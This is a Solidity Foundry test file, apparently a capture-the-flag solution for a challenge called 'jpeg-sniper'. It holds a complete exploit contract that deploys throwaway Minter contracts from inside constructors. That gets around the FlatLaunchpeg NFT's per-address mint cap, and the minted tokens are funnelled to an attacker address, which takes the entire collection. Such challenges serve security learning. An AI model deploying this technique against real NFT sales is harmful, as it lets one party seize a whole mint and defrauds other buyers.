// SPDX-License-Identifier: MIT
pragma solidity ^0.8.16;

import {Utilities} from "../Utilities.sol";
import {Test} from "forge-std/Test.sol";
import {FlatLaunchpeg} from "../../src/jpeg-sniper/FlatLaunchpeg.sol";

contract Exploit {
  constructor(FlatLaunchpeg _nft) {
    run(_nft, msg.sender);
  }

  function run(FlatLaunchpeg _nft, address _to) private {
    uint256 collectionSize = _nft.collectionSize();
    uint256 maxPerAddress = _nft.maxPerAddressDuringMint();

    uint256 startIndex = _nft.totalSupply();
    uint256 minters = (collectionSize - startIndex) / maxPerAddress;

    for (uint256 i = 0; i < minters; ++i) {
      new Minter(_nft, _to, maxPerAddress, startIndex);
      startIndex += maxPerAddress;
    }

    uint256 remainder = (collectionSize - startIndex) % maxPerAddress;
    if (remainder > 0) {
      new Minter(_nft, _to, remainder, startIndex);
    }
  }
}

contract Minter {
  constructor(
    FlatLaunchpeg _nft,
    address _to,
    uint256 _amountToMint,
    uint256 _startIndex
  ) {
    _nft.publicSaleMint(_amountToMint);
    for (uint256 i = 0; i < _amountToMint; ++i) {
      _nft.transferFrom(address(this), _to, _startIndex + i);
    }
    selfdestruct(payable(_to));
  }
}

contract FlatLaunchpegTest is Test {
  uint256 private constant COLLECTION_SIZE = 69;
  uint256 private constant MAX_PER_ADDRESS_DURING_MINT = 5;

  Utilities private utils;
  address payable private attacker;
  address payable[] users;
  uint256 private startBlock;
  FlatLaunchpeg private flatLaunchpeg;

  function setUp() public {
    utils = new Utilities();

    users = utils.createUsers(14);
    attacker = users[0];
    vm.label(attacker, "Attacker");

    startBlock = block.number;

    flatLaunchpeg = new FlatLaunchpeg(COLLECTION_SIZE, MAX_PER_ADDRESS_DURING_MINT);
    vm.label(address(flatLaunchpeg), "FlatLaunchpeg");
  }

  function testExploit() public {
    // Exploit start

    vm.startPrank(attacker);
    new Exploit(flatLaunchpeg);
    vm.stopPrank();

    // Exploit end

    validate();
  }

  function validate() private {
    assertEq(flatLaunchpeg.totalSupply(), flatLaunchpeg.collectionSize());
    assertEq(flatLaunchpeg.balanceOf(attacker), flatLaunchpeg.collectionSize());
  }
}
